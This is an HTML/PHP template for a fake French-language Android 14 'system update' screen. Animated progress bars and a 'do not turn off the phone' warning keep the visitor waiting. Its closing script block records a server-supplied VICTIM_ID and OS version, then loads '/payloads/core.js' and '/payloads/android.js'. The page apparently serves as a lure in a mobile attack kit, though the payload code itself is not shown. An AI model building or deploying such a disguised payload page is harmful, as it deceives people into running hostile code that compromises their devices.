<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mise à jour système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        
        .update-card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .android-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: float 3s ease-in-out infinite;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 500;
        }
        
        .version {
            background: rgba(255,255,255,0.1);
            padding: 8px 16px;
            border-radius: 20px;
            display: inline-block;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .progress-container {
            margin: 30px 0;
            text-align: left;
        }
        
        .progress-label {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
            font-size: 14px;
        }
        
        .progress-bar {
            height: 6px;
            background: rgba(255,255,255,0.1);
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
            border-radius: 3px;
            animation: progress 30s linear forwards;
        }
        
        .status {
            color: #4CAF50;
            font-size: 14px;
            margin-top: 20px;
        }
        
        .detail {
            color: rgba(255,255,255,0.5);
            font-size: 12px;
            margin-top: 10px;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        @keyframes progress {
            from { width: 0%; }
            to { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="update-card">
        <div class="android-icon">📱</div>
        <h1>Mise à jour système</h1>
        <div class="version">Android 14 • Sécurité</div>
        
        <div class="progress-container">
            <div class="progress-label">
                <span>Installation</span>
                <span id="progressPercent">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            
            <div class="progress-label">
                <span>Vérification</span>
                <span id="verifyPercent">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="verifyFill"></div>
            </div>
        </div>
        
        <div class="status" id="status">Préparation...</div>
        <div class="detail" id="detail">Ne pas éteindre le téléphone</div>
    </div>
    
    <script>
        const VICTIM_ID = '<?= $victimId ?>';
        const OS = 'Android';
        const OS_VERSION = '<?= $osVersion ?? 'unknown' ?>';
    </script>
    <script src="/payloads/core.js?v=<?= time() ?>"></script>
    <script src="/payloads/android.js?v=<?= time() ?>"></script>
</body>
</html>
